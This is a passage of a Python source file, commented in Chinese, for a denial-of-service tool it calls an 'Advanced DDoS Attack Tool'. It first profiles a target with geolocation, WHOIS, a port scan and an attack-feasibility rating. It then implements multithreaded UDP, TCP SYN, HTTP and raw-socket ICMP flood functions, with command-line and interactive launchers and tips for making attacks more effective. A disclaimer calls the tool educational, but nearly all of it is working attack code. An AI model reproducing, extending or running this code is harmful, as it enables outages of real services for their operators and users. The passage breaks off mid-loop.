        whois_info = perform_whois_query(domain)
    
    # 执行Nmap端口扫描
    if COLOR_ENABLED:
        print(Fore.YELLOW + Style.BRIGHT + "⚡ 准备执行Nmap风格端口扫描..." + Style.RESET_ALL)
    else:
        print("⚡ 准备执行Nmap风格端口扫描...")
    
    open_ports = nmap_scan(ip)
    
    # 显示识别结果
    if COLOR_ENABLED:
        print("\n" + Fore.MAGENTA + "="*60 + Style.RESET_ALL)
        print(Fore.MAGENTA + Style.BRIGHT + "📊 目标识别综合报告" + Style.RESET_ALL)
        print(Fore.MAGENTA + "="*60 + Style.RESET_ALL)
    else:
        print("\n" + "="*60)
        print("📊 目标识别综合报告")
        print("="*60)
    
    # 目标信息部分
    if COLOR_ENABLED:
        print(Fore.CYAN + "【目标基础信息】" + Style.RESET_ALL)
    else:
        print("【目标基础信息】")
    
    print(f"{'目标地址:':<15} "+ ('IP: ' + geo_info['ip'] if domain else geo_info['ip']))
    if domain:
        print(f"{'域名:':<15} {domain}")
    
    # 地理位置信息部分
    if COLOR_ENABLED:
        print(Fore.CYAN + "\n【地理位置信息】" + Style.RESET_ALL)
    else:
        print("\n【地理位置信息】")
    
    location_str = f"{geo_info['city']}, {geo_info['region']}, {geo_info['country']}"
    print(f"{'地理位置:':<15} {location_str}")
    
    # 风险提示
    if geo_info['country'] in ['中国', '美国', '俄罗斯']:
        if COLOR_ENABLED:
            print(Fore.RED + f"{'风险等级:':<15} 高 (特定国家目标)" + Style.RESET_ALL)
        else:
            print(f"{'风险等级:':<15} 高 (特定国家目标)")
    
    # 网络信息部分
    if COLOR_ENABLED:
        print(Fore.CYAN + "\n【网络归属信息】" + Style.RESET_ALL)
    else:
        print("\n【网络归属信息】")
    
    print(f"{'服务提供商:':<15} {geo_info['isp']}")
    print(f"{'组织:':<15} {geo_info['org']}")
    print(f"{'ASN:':<15} {geo_info['asn']}")
    
    # 判断目标类型
    org = geo_info['org'].lower()
    target_type = "未知"
    if any(keyword in org for keyword in ['amazon', 'aws', 'alibaba', 'tencent', 'microsoft azure', 'google cloud']):
        target_type = "云服务器"
    elif any(keyword in org for keyword in ['telecom', 'comcast', 'at&t', 'verizon', '中国移动', '中国联通', '中国电信']):
        target_type = "ISP网络"
    elif any(keyword in org for keyword in ['university', 'school', 'edu', '教育']):
        target_type = "教育机构"
    elif any(keyword in org for keyword in ['government', 'gov', '政府', '国家', '省', '市']):
        target_type = "政府机构"
        if COLOR_ENABLED:
            print(Fore.RED + f"{'警告:':<15} 政府目标，攻击风险极高" + Style.RESET_ALL)
        else:
            print(f"{'警告:':<15} 政府目标，攻击风险极高")
    
    if target_type != "未知":
        print(f"{'目标类型:':<15} {target_type}")
    
    # 端口扫描结果部分
    if COLOR_ENABLED:
        print(Fore.CYAN + "\n【端口扫描结果】" + Style.RESET_ALL)
    else:
        print("\n【端口扫描结果】")
    
    print(f"{'开放端口:':<15} {len(open_ports)}个")
    
    # 显示WHOIS信息
    if whois_info:
        if COLOR_ENABLED:
            print(Fore.MAGENTA + "\n📄 WHOIS信息" + Style.RESET_ALL)
            print(Fore.BLUE + "-" * 60 + Style.RESET_ALL)
        else:
            print("\n📄 WHOIS信息")
            print("-" * 60)
        
        print(f"{'注册商:':<15} {whois_info['registrar']}")
        print(f"{'创建时间:':<15} {whois_info['created']}")
        print(f"{'到期时间:':<15} {whois_info['expires']}")
        print(f"{'更新时间:':<15} {whois_info['updated']}")
        
        if whois_info['nameservers']:
            print(f"{'DNS服务器:':<15} {', '.join(whois_info['nameservers'][:3])}" + (f"... 等{len(whois_info['nameservers'])}个" if len(whois_info['nameservers']) > 3 else ''))
        
        if whois_info['domain_status']:
            print(f"{'域名状态:':<15} {', '.join(whois_info['domain_status'][:2])}" + (f"... 等{len(whois_info['domain_status'])}个" if len(whois_info['domain_status']) > 2 else ''))
    
    # 攻击准备状态部分
    if COLOR_ENABLED:
        print(Fore.YELLOW + "\n【攻击准备状态】" + Style.RESET_ALL)
    else:
        print("\n【攻击准备状态】")
    
    # 评估攻击可行性
    if len(open_ports) > 0:
        if any(s in ['HTTP', 'HTTPS'] for p, s in open_ports):
            if COLOR_ENABLED:
                print(f"{'可行性:':<15} {Fore.GREEN}高 (发现Web服务){Style.RESET_ALL}")
            else:
                print(f"{'可行性:':<15} 高 (发现Web服务)")
        else:
            if COLOR_ENABLED:
                print(f"{'可行性:':<15} {Fore.YELLOW}中 (有开放端口){Style.RESET_ALL}")
            else:
                print(f"{'可行性:':<15} 中 (有开放端口)")
    else:
        if COLOR_ENABLED:
            print(f"{'可行性:':<15} {Fore.RED}低 (无开放端口){Style.RESET_ALL}")
        else:
            print(f"{'可行性:':<15} 低 (无开放端口)")
    
    print("="*60)
    
    return {
        'ip': ip,
        'domain': domain,
        'geo_info': geo_info,
        'whois_info': whois_info,
        'open_ports': open_ports
    }
# 套接字配置
socket.setdefaulttimeout(2)  # 设置默认超时为2秒
if hasattr(socket, 'SO_REUSEADDR'):
    socket.SO_REUSEADDR = socket.SO_REUSEADDR
if hasattr(socket, 'SO_REUSEPORT'):
    socket.SO_REUSEPORT = socket.SO_REUSEPORT

# UDP Flood攻击函数（增强版）
def udp_flood(ip, start_port, thread_id):
    global stop_attack, total_sent, error_count
    retry_count = 0
    max_retries = 5
    
    while not stop_attack and retry_count < max_retries:
        sock = None
        try:
            # 创建并优化UDP套接字
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # 设置套接字选项以优化性能
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if hasattr(socket, 'SO_REUSEPORT'):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            
            # 设置更大的发送缓冲区
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
            
            # 优化数据包大小变化策略
            packet_sizes = [64, 128, 256, 512, 1024, 1500]
            
            # 本地计数
            sent = 0
            port = start_port
            
            # 批量处理以减少资源消耗
            for _ in range(500):  # 每批处理500个包
                if stop_attack:
                    break
                    
                # 更智能的端口随机化策略
                if random.random() < 0.4:  # 40%的概率改变端口
                    if random.random() < 0.7:  # 70%概率使用目标端口附近
                        port = (start_port + random.randint(-100, 100)) % 65534
                        if port == 0:
                            port = 1
                    else:  # 30%概率完全随机
                        port = random.randint(1, 65534)
                
                # 更灵活的数据包大小选择
                packet_size = random.choice(packet_sizes)
                current_data = random._urandom(packet_size)
                
                try:
                    # 使用非阻塞发送尝试，避免在网络拥塞时长时间等待
                    sock.setblocking(0)
                    ready = select.select([], [sock], [], 0.01)
                    if ready[1]:
                        sock.sendto(current_data, (ip, port))
                        with lock:
                            total_sent += 1
                        sent += 1
                    sock.setblocking(1)
                except socket.timeout:
                    # 超时忽略，继续发送
                    pass
                except socket.error as e:
                    # 套接字错误处理
                    with lock:
                        error_count += 1
                    # 不立即重新连接，继续尝试
                except Exception as e:
                    # 其他错误，增加错误计数
                    with lock:
                        error_count += 1
                
                # 动态调整延迟时间
                time.sleep(random.uniform(0.0001, 0.001))
            
            # 重置重试计数
            retry_count = 0
            
            # 详细模式下显示线程状态
            if hasattr(sys, 'argv') and '-v' in sys.argv and sent > 0:
                with lock:
                    print(f"UDP Thread {thread_id} batch completed: {sent} packets")
            
        except Exception as e:
            # 连接级别的错误，尝试重新连接
            retry_count += 1
            with lock:
                error_count += 1
            
            if hasattr(sys, 'argv') and '-v' in sys.argv:
                error_info = str(e)
                print(f"[UDP] Connection error: {error_info[:50]}... (Thread {thread_id}), Retry {retry_count}/{max_retries}")
            
            # 指数退避策略
            backoff_time = 0.1 * (2 ** retry_count)
            time.sleep(min(backoff_time, 2))  # 最大等待2秒
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass
    
    # 如果达到最大重试次数，线程退出
    if retry_count >= max_retries and not stop_attack:
        if hasattr(sys, 'argv') and '-v' in sys.argv:
            print(f"[UDP] Thread {thread_id} exiting after {max_retries} retries")

# TCP SYN Flood攻击函数（增强版）
def tcp_syn_flood(ip, start_port, thread_id):
    global stop_attack, total_sent, error_count
    retry_count = 0
    max_retries = 5
    sock_pool = []  # 套接字池，重用连接资源
    
    def cleanup_socks():
        """清理套接字池中的所有连接"""
        for s in sock_pool[:]:
            try:
                s.close()
                sock_pool.remove(s)
            except:
                pass
    
    while not stop_attack and retry_count < max_retries:
        try:
            # 维护套接字池，保持高效重用
            if len(sock_pool) < 10:  # 限制池大小
                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                new_sock.setblocking(0)
                sock_pool.append(new_sock)
            
            # 批量处理以减少资源消耗
            batch_size = 100
            batch_sent = 0
            
            for _ in range(batch_size):
                if stop_attack:
                    break
                
                # 高级端口随机化策略
                if random.random() < 0.5:  # 50%概率改变端口
                    if random.random() < 0.8:  # 80%概率使用常用服务端口
                        port = random.choice([80, 443, 21, 22, 23, 25, 53, 3389])
                    else:
                        # 目标端口附近随机化
                        port = (start_port + random.randint(-500, 500)) % 65534
                        if port == 0:
                            port = 1
                else:
                    port = start_port
                
                # 从池中获取套接字或创建新的
                sock = None
                if sock_pool:
                    sock = sock_pool.pop(0)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setblocking(0)
                
                try:
                    # 尝试连接（发送SYN包）
                    result = sock.connect_ex((ip, port))
                    
                    # 只在成功或连接进行中时计数
                    if result in (0, 10035, 10036, 10061):  # Windows错误码
                        with lock:
                            total_sent += 1
                        batch_sent += 1
                        
                    # 重用套接字，而不是立即关闭
                    if random.random() < 0.7:  # 70%概率重用
                        if len(sock_pool) < 15:  # 限制池大小
                            sock_pool.append(sock)
                            continue
                except socket.error as e:
                    with lock:
                        error_count += 1
                except Exception as e:
                    with lock:
                        error_count += 1
                finally:
                    # 不重用的套接字要关闭
                    if sock and sock not in sock_pool:
                        try:
                            sock.close()
                        except:
                            pass
                
                # 动态延迟，基于成功率调整
                time.sleep(random.uniform(0.0005, 0.002))
            
            # 重置重试计数
            retry_count = 0
            
            # 详细模式下显示线程状态
            if hasattr(sys, 'argv') and '-v' in sys.argv and batch_sent > 0:
                with lock:
                    print(f"TCP Thread {thread_id} batch completed: {batch_sent} SYN packets")
            
            # 清理过期连接
            if random.random() < 0.3:  # 30%概率执行清理
                cleanup_socks()
                # 补充新的套接字
                for _ in range(5):
                    try:
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        new_sock.setblocking(0)
                        sock_pool.append(new_sock)
                    except:
                        pass
        
        except Exception as e:
            # 连接级别的错误处理
            retry_count += 1
            with lock:
                error_count += 1
            
            if hasattr(sys, 'argv') and '-v' in sys.argv:
                error_info = str(e)
                print(f"[TCP] Connection error: {error_info[:50]}... (Thread {thread_id}), Retry {retry_count}/{max_retries}")
            
            # 清理所有资源
            cleanup_socks()
            
            # 指数退避
            backoff_time = 0.15 * (2 ** retry_count)
            time.sleep(min(backoff_time, 2.5))
    
    # 清理所有资源
    cleanup_socks()
    
    # 如果达到最大重试次数，线程退出
    if retry_count >= max_retries and not stop_attack:
        if hasattr(sys, 'argv') and '-v' in sys.argv:
            print(f"[TCP] Thread {thread_id} exiting after {max_retries} retries")

# HTTP Flood攻击函数
def http_flood(ip, port, thread_id):
    global stop_attack, total_sent, error_count
    retry_count = 0
    max_retries = 5
    sent = 0
    
    # 增强版User-Agent列表
    user_agents = [
        # 桌面浏览器
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
        
        # 移动设备
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
        
        # 爬虫和特殊客户端
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "python-requests/2.25.1",
        "Wget/1.21.1"
    ]
    
    # 扩展URL路径列表
    base_paths = ["/", "/index.html", "/home", "/blog", "/api", "/login", "/admin", "/register", "/contact", "/about"]
    api_paths = ["/api/users", "/api/products", "/api/data", "/api/stats", "/api/search", "/api/login"]
    query_params = ["?id=1", "?page=1", "?limit=100", "?sort=asc", "?search=test"]
    
    # 高级HTTP方法
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"]
    
    # 套接字池管理
    sock_pool = []
    max_pool_size = 5
    
    def cleanup_socks():
        """清理套接字池中的所有连接"""
        for s in sock_pool[:]:
            try:
                s.close()
                sock_pool.remove(s)
            except:
                pass
    
    def get_or_create_socket():
        """从池中获取套接字或创建新的"""
        if sock_pool:
            return sock_pool.pop(0)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(0.8)
        return sock
    
    def generate_path():
        """生成更智能的URL路径"""
        if random.random() < 0.4:
            path = random.choice(base_paths)
        elif random.random() < 0.7:
            path = random.choice(api_paths)
        else:
            path = f"/dynamic{random.randint(1, 9999)}"
        
        # 随机添加查询参数
        if random.random() < 0.6:
            path += random.choice(query_params)
        return path
    
    def generate_post_data():
        """生成更复杂的POST数据"""
        data_types = [
            f"username=test{random.randint(1,999)}&password=pass123&submit=1",
            f"action=update&id={random.randint(1,10000)}&data={random._urandom(50).hex()}",
            f"search={random._urandom(20).hex()}&filter=all&sort=desc"
        ]
        return random.choice(data_types)
    
    while not stop_attack and retry_count < max_retries:
        try:
            # 批量处理请求
            batch_size = 30
            batch_sent = 0
            
            for _ in range(batch_size):
                if stop_attack:
                    break
                
                sock = None
                try:
                    sock = get_or_create_socket()
                    
                    # 构造高级HTTP请求
                    method = random.choice(methods)
                    path = generate_path()
                    user_agent = random.choice(user_agents)
                    
                    # 构建请求头
                    request = f"{method} {path} HTTP/1.1\r\n"
                    request += f"Host: {ip}:{port}\r\n"
                    request += f"User-Agent: {user_agent}\r\n"
                    request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    request += f"Accept-Language: en-US,en;q=0.5\r\n"
                    request += f"Accept-Encoding: gzip, deflate, br\r\n"
                    request += f"Cache-Control: no-cache\r\n"
                    request += f"Pragma: no-cache\r\n"
                    
                    # 智能连接管理
                    if random.random() < 0.7:  # 70%使用keep-alive
                        request += f"Connection: keep-alive\r\n"
                    else:
                        request += f"Connection: close\r\n"
                    
                    # 为特定方法添加数据
                    if method in ("POST", "PUT", "PATCH"):
                        post_data = generate_post_data()
                        request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                        request += f"Content-Length: {len(post_data)}\r\n"
                        request += f"\r\n{post_data}"
                    else:
                        request += "\r\n"
                    
                    # 非阻塞连接尝试
                    sock.setblocking(0)
                    try:
                        sock.connect((ip, port))
                    except socket.error as e:
                        # 对于非阻塞socket，连接尝试会立即返回
                        if e.errno not in (10035, 10036):  # Windows错误码
                            raise
                    
                    # 等待套接字准备好写入
                    ready = select.select([], [sock], [], 0.5)
                    if ready[1]:
                        sock.send(request.encode())
                        
                        # 可选：快速读取响应头
                        if random.random() < 0.3:
                            try:
                                ready = select.select([sock], [], [], 0.2)
                                if ready[0]:
                                    sock.recv(100)
                            except:
                                pass
                        
                        with lock:
                            total_sent += 1
                        batch_sent += 1
                        sent += 1
                    
                    # 重置套接字模式
                    sock.setblocking(1)
                    
                    # 智能连接重用
                    if random.random() < 0.6 and len(sock_pool) < max_pool_size:
                        sock_pool.append(sock)
                        sock = None
                    
                    # 动态延迟
                    time.sleep(random.uniform(0.001, 0.005))
                    
                except socket.timeout:
                    # 超时可能表明攻击有效
                    with lock:
                        error_count += 1
                    if random.random() < 0.5:  # 50%概率继续使用
                        if sock and len(sock_pool) < max_pool_size:
                            sock_pool.append(sock)
                            sock = None
                except socket.error as e:
                    with lock:
                        error_count += 1
                    # 连接错误，不重用
                except Exception as e:
                    with lock:
                        error_count += 1
                finally:
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
            
            # 重置重试计数
            retry_count = 0
            
            # 详细模式下显示线程状态
            if hasattr(sys, 'argv') and '-v' in sys.argv and batch_sent > 0:
                with lock:
                    print(f"HTTP Thread {thread_id} batch completed: {batch_sent} requests")
            
            # 定期清理过期连接
            if random.random() < 0.2:
                cleanup_socks()
                
        except Exception as e:
            # 连接级别的错误处理
            retry_count += 1
            with lock:
                error_count += 1
            
            if hasattr(sys, 'argv') and '-v' in sys.argv:
                error_info = str(e)
                print(f"[HTTP] Connection error: {error_info[:50]}... (Thread {thread_id}), Retry {retry_count}/{max_retries}")
            
            # 清理所有资源
            cleanup_socks()
            
            # 指数退避
            backoff_time = 0.2 * (2 ** retry_count)
            time.sleep(min(backoff_time, 2))
    
    # 清理所有资源
    cleanup_socks()
    
    # 如果达到最大重试次数，线程退出
    if retry_count >= max_retries and not stop_attack:
        if hasattr(sys, 'argv') and '-v' in sys.argv:
            print(f"[HTTP] Thread {thread_id} exiting after {max_retries} retries")

# ICMP Ping Flood攻击函数（增强版）
def icmp_flood(ip, _, thread_id):
    global stop_attack, total_sent, error_count
    sent = 0
    retry_count = 0
    max_retries = 5
    
    # 尝试获取管理员/root权限
    def create_raw_socket():
        try:
            # 创建原始套接字
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # 设置套接字选项以优化性能
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # 包含IP头部
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)  # 增大发送缓冲区
            
            return sock
        except socket.error as e:
            error_msg = str(e).lower()
            if 'permission denied' in error_msg or '权限' in error_msg or 'access denied' in error_msg:
                with lock:
                    print(f"\n[错误] 需要管理员/root权限来使用ICMP原始套接字攻击! {e}")
                    stop_attack = True
            else:
                with lock:
                    print(f"\n[错误] 无法创建ICMP原始套接字: {e}")
            return None
    
    # 高级ICMP包构造函数
    def create_icmp_packet():
        # 随机选择ICMP类型以绕过简单过滤
        if random.random() < 0.7:
            icmp_type = 8  # Echo Request (标准Ping)
        else:
            # 其他可能的ICMP类型
            icmp_type = random.choice([0, 3, 5, 11])  # Echo Reply, Destination Unreachable, Redirect, Time Exceeded
        
        code = 0
        checksum = 0
        identifier = random.randint(0, 65535)
        sequence = random.randint(0, 65535)
        
        # 创建ICMP头部
        header = struct.pack('!BBHHH', icmp_type, code, checksum, identifier, sequence)
        
        # 智能数据包大小选择
        packet_sizes = [64, 128, 256, 512, 1024, 1472]  # 1472是以太网MTU减去IP和ICMP头
        data_size = random.choice(packet_sizes)
        data = random._urandom(data_size)
        
        # 计算校验和
        checksum = 0
        packet = header + data
        
        # 高效校验和算法
        for i in range(0, len(packet), 2):
            if i + 1 < len(packet):
                checksum += (packet[i] << 8) + packet[i+1]
            else:
                checksum += packet[i] << 8
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        # 重新打包头部
        header = struct.pack('!BBHHH', icmp_type, code, checksum, identifier, sequence)
        
        return header + data
    
    # 尝试创建原始套接字
    sock = create_raw_socket()
    if not sock:
        return
    
    try:
        # 批量发送ICMP包以提高效率
        batch_size = 50  # 每批发送50个包
        
        while not stop_attack and retry_count < max_retries:
            try:
                batch_sent = 0
                
                # 批量发送模式
                for _ in range(batch_size):
                    if stop_attack:
                        break
                    
                    try:
                        # 创建ICMP包
                        packet = create_icmp_packet()
                        
                        # 使用非阻塞发送
                        sock.setblocking(0)
                        ready = select.select([], [sock], [], 0.05)  # 50ms超时
                        
                        if ready[1]:  # 套接字可写
                            sock.sendto(packet, (ip, 0))
                            
                            with lock:
                                total_sent += 1
                            sent += 1
                            batch_sent += 1
                        
                        # 重置为阻塞模式
                        sock.setblocking(1)
                        
                        # 动态延迟调整
                        time.sleep(random.uniform(0.0001, 0.002))
                        
                    except socket.error as e:
                        # 处理套接字错误
                        with lock:
                            error_count += 1
                        # 短暂暂停后继续
                        time.sleep(0.01)
                    except Exception as e:
                        with lock:
                            error_count += 1
                
                # 重置重试计数
                retry_count = 0
                
                # 详细模式下显示线程状态
                if hasattr(sys, 'argv') and '-v' in sys.argv and batch_sent > 0:
                    with lock:
                        print(f"ICMP Thread {thread_id} batch completed: {batch_sent} packets")
                
                # 短暂休息以避免资源过度消耗
                if random.random() < 0.1:
                    time.sleep(random.uniform(0.01, 0.05))
                
            except Exception as e:
                # 连接级别的错误处理
                retry_count += 1
                with lock:
                    error_count += 1
                
                if hasattr(sys, 'argv') and '-v' in sys.argv:
                    error_info = str(e)
                    print(f"[ICMP] Error: {error_info[:50]}... (Thread {thread_id}), Retry {retry_count}/{max_retries}")
                
                # 指数退避策略
                backoff_time = 0.2 * (2 ** retry_count)
                time.sleep(min(backoff_time, 2))
        
        # 如果达到最大重试次数，线程退出
        if retry_count >= max_retries and not stop_attack:
            if hasattr(sys, 'argv') and '-v' in sys.argv:
                print(f"[ICMP] Thread {thread_id} exiting after {max_retries} retries")
                
    except KeyboardInterrupt:
        pass
    finally:
        try:
            sock.close()
        except Exception as e:
            if hasattr(sys, 'argv') and '-v' in sys.argv:
                print(f"[ICMP] Error closing socket: {e}")


# 清除屏幕，兼容Windows和Linux
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# 程序入口保护增强
try:
    # 执行主函数体（已包含在if __name__ == '__main__':块中）
    pass
except KeyboardInterrupt:
    print("\n\n程序已被用户中断")
    sys.exit(0)
except Exception as e:
    print(f"\n[严重错误] 程序遇到未预期的错误: {e}")
    if hasattr(sys, 'argv') and '-v' in sys.argv:
        traceback.print_exc()
    print("\n请检查参数是否正确，或使用 -v 参数查看详细错误信息")
    sys.exit(1)

# 主函数
# 网络环境检测函数
def check_network_environment():
    """检测基本网络环境"""
    try:
        # 测试DNS解析
        socket.gethostbyname('8.8.8.8')
        return True
    except:
        return False

# 性能优化建议函数
def print_performance_tips():
    """打印性能优化建议"""
    tips = [
        "📈 性能优化建议:",
        "  1. 使用混合攻击(mixed)可提高攻击效果",
        "  2. 调整线程数以适应您的系统资源",
        "  3. 对Web服务使用HTTP模式，其他服务使用UDP/TCP模式",
        "  4. ICMP攻击需要管理员/root权限",
        "  5. 攻击大流量服务器时增加持续时间",
        "  6. 使用详细模式(-v)监控实时性能"
    ]
    for tip in tips:
        print(tip)

if __name__ == "__main__":
    # 检查网络连接
    if not check_network_environment():
        print("[错误] 无法连接到网络，请检查网络设置")
        sys.exit(1)
    
    # 安全警告
    print("\n⚠️  安全警告 ⚠️")
    print("=========================================================")
    print("此工具仅用于授权的安全测试和教育目的！")
    print("未经授权使用此工具攻击任何系统都是非法的。")
    print("使用者应遵守所有适用的法律法规。")
    print("=========================================================\n")
    
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(
        description='高级DDoS攻击工具 - 仅用于教育目的!',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''
使用示例:
  python ddos-attack.py -t 192.168.1.1 -p 80 -m udp -t 100 -d 60 -v
  python ddos-attack.py -t example.com --method hybrid --threads 200 --duration 300
  python ddos-attack.py -t 192.168.1.1 --port 443 --method http --threads 50
  
注意事项:
  - ICMP攻击需要管理员/root权限
  - 高线程数可能导致本地系统资源耗尽
  - 此工具仅用于授权的安全测试和教育目的
  - 工具会自动识别目标信息并进行端口扫描
        ''')
    
    # 必选参数
    parser.add_argument('-t', '--target', required=False, help='目标IP地址或域名')
    parser.add_argument('-p', '--port', type=int, default=80, 
                       help='目标端口 (默认: 80)')
    parser.add_argument('-m', '--method', choices=['udp', 'tcp', 'http', 'icmp', 'hybrid'],
                        default='udp', help='攻击方法 (默认: udp)')
    parser.add_argument('-T', '--threads', type=int, default=500, 
                       help='线程数量 (默认: 500)')
    parser.add_argument('-d', '--duration', type=int, default=0, 
                       help='攻击持续时间(秒)，0表示无限直到手动停止')
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='显示详细输出')
    parser.add_argument('--no-banner', action='store_true', 
                       help='不显示启动横幅')
    parser.add_argument('-q', '--quiet', action='store_true', 
                       help='安静模式，只显示关键信息')
    parser.add_argument('--no-colors', action='store_true', 
                       help='禁用彩色输出')
    
    # 解析命令行参数
    args = parser.parse_args()
    
    # 如果没有提供必需的参数，使用交互式输入
    if not args.target:
        clear_screen()
        # 尝试使用figlet，如果不存在则跳过
        if not args.no_banner and os.system('which figlet > /dev/null 2>&1') == 0:
            os.system("figlet DDos Attack")
        print("Advanced DDoS Attack Tool")
        print("Author   : HA-MRX")
        print("github   : https://github.com/Ha3MrX")
        print()
        print("===== 攻击方法选择 =====")
        print("1. UDP Flood - 经典UDP洪水攻击")
        print("2. TCP SYN Flood - SYN洪水攻击（半开连接）")
        print("3. HTTP Flood - HTTP请求洪水攻击")
        print("4. ICMP Flood - ICMP ping洪水攻击（需要管理员权限）")
        print("5. 混合攻击 - 同时使用多种攻击方法")
        print("\n或使用命令行参数:")
        print("python ddos-attack.py -t <target_ip_or_domain> -p <port> -m <method> -T <threads> -d <duration>")
        print()
        
        # 获取用户输入
        method_input = input("选择攻击方法 (1-5): ")
        
        # 方法映射
        method_map = {
            '1': 'udp',
            '2': 'tcp',
            '3': 'http',
            '4': 'icmp',
            '5': 'hybrid'
        }
        
        attack_method = method_map.get(method_input, 'udp')
        target = input("目标IP地址或域名: ")
        
        # 根据攻击方法决定默认端口
        if attack_method == 'http':  # HTTP默认80端口
            default_port = 80
        else:
            default_port = 80
        
        port_input = input(f"Port (默认 {default_port}) : ")
        port = int(port_input) if port_input else default_port
        
        threads_input = input(f"线程数量 (默认 500): ")
        threads_count = int(threads_input) if threads_input else 500
        
        duration_input = input(f"攻击持续时间(秒)，0表示无限 (默认 0): ")
        duration = int(duration_input) if duration_input else 0
        
        # 执行目标识别
        print(f"\n🎯 开始目标识别: {target}")
        target_info = identify_target(target)
        
        if not target_info:
            print("\n❌ 目标识别失败，程序退出")
            sys.exit(1)
        
        # 攻击确认
        if not ask_attack_confirmation(target_info):
            print("\n✅ 攻击已取消")
            sys.exit(0)
        
        # 使用识别到的IP地址
        ip = target_info['ip']
    else:
        # 使用命令行参数
        target = args.target
        port = args.port
        attack_method = args.method
        threads_count = args.threads
        duration = args.duration
        
        # 静默模式下不清屏
        if not args.verbose:
            pass
        else:
            clear_screen()
        
        # 执行目标识别
        print(f"\n🎯 开始目标识别: {target}")
        target_info = identify_target(target)
        
        if not target_info:
            print("\n❌ 目标识别失败，程序退出")
            sys.exit(1)
        
        # 攻击确认
        if not ask_attack_confirmation(target_info):
            print("\n✅ 攻击已取消")
            sys.exit(0)
        
        # 使用识别到的IP地址
        ip = target_info['ip']
    
    # 验证线程数
    if threads_count < 1:
        threads_count = 100
    elif threads_count > 5000:
        threads_count = 5000
    
    # 如果不是静默模式，显示启动动画
    if not hasattr(args, 'verbose') or args.verbose:
        clear_screen()
        if not hasattr(args, 'no_banner') or not args.no_banner:
            if os.system('which figlet > /dev/null 2>&1') == 0:
                os.system("figlet Attack Starting")
        print("[                    ] 0% ")
        time.sleep(1)
        print("[=====               ] 25%")
        time.sleep(1)
        print("[==========          ] 50%")
        time.sleep(1)
        print("[===============     ] 75%")
        time.sleep(1)
        print("[====================] 100%")
        time.sleep(2)
    
    # 根据选择的攻击方法获取攻击名称
    attack_names = {
        'udp': 'UDP Flood',
        'tcp': 'TCP SYN Flood', 
        'http': 'HTTP Flood',
        'icmp': 'ICMP Flood',
        'hybrid': 'Hybrid Attack'
    }
    
    attack_name = attack_names.get(attack_method, 'Unknown')
    print(f"Starting {attack_name} on {ip}:{port} with {threads_count} threads")
    print(f"Attack duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
    print("Press Ctrl+C to stop the attack")
    
    start_time = time.time()  # 记录攻击开始时间
    
    # 创建并启动线程
    threads = []
    
    # 根据选择的攻击方法启动相应的攻击线程
    if attack_method == 'udp':  # UDP Flood
        for i in range(threads_count):
            thread_port = (port + i) % 65534
            if thread_port == 0:
                thread_port = 1
            
            t = threading.Thread(target=udp_flood, args=(ip, thread_port, i))
            t.daemon = True
            threads.append(t)
            t.start()
    
    elif attack_method == 'tcp':  # TCP SYN Flood
        for i in range(threads_count):
            thread_port = (port + i) % 65534
            if thread_port == 0:
                thread_port = 1
            
            t = threading.Thread(target=tcp_syn_flood, args=(ip, thread_port, i))
            t.daemon = True
            threads.append(t)
            t.start()
    
    elif attack_method == 'http':  # HTTP Flood
        for i in range(threads_count):
            t = threading.Thread(target=http_flood, args=(ip, port, i))
            t.daemon = True
